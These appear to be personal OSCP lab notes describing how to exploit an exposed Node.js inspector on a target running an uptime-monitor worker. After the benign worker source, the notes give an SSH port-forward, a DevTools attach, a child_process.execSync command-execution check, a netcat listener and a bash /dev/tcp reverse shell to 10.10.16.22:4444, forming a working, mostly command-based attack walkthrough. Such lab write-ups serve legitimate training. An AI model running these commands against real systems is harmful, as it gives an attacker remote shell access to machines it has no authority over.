/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js

cat /opt/uptime-monitor/worker.js

```
const http = require('http'); const fs = require('fs'); const TARGET_URL = 'http://127.0.0.1:3000/'; const CSV_FILE = '/var/log/uptime-monitor.csv'; const INTERVAL_MS = 30_000; const TIMEOUT_MS = 10_000; function csvEscape(value) { const s = String(value ?? ''); return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s; } function record({ status, latency, size, error }) { const row = [ new Date().toISOString(), status ?? '', latency ?? '', size ?? '', error ?? '', ] .map(csvEscape) .join(',') + '\n'; fs.appendFileSync(CSV_FILE, row); } function probe() { const start = process.hrtime.bigint(); let bytes = 0; const req = http.get(TARGET_URL, { timeout: TIMEOUT_MS }, (res) => { res.on('data', (chunk) => { bytes += chunk.length; }); res.on('end', () => { const latencyMs = Number( (process.hrtime.bigint() - start) / 1_000_000n ); record({ status: res.statusCode, latency: latencyMs, size: bytes, }); }); }); req.on('error', (error) => { const latencyMs = Number( (process.hrtime.bigint() - start) / 1_000_000n ); record({ latency: latencyMs, error: error.code || error.message, }); }); req.on('timeout', () => { req.destroy(); record({ latency: TIMEOUT_MS, error: 'TIMEOUT', }); }); } setInterval(probe, INTERVAL_MS); probe(); console.log('uptime-monitor up, pid=' + process.pid);
```

---

SSH to local machine first
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `ssh -L 9229:127.0.0.1:9229 engineer@${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

Now attach debugger.

Open chromium

```
chrome://inspect
```

Open this website

use devtools popup

add 
```
localhost:9229
```

---

click on console

paste

```
require('child_process').execSync('id').toString()
```

if responds, 

then 

```
rlwrap nc -lvnp 4444
```

Command execution with reverse shell
```
require('child_process').execSync('bash -c "bash -i >& /dev/tcp/10.10.16.22/4444 0>&1"').toString()
```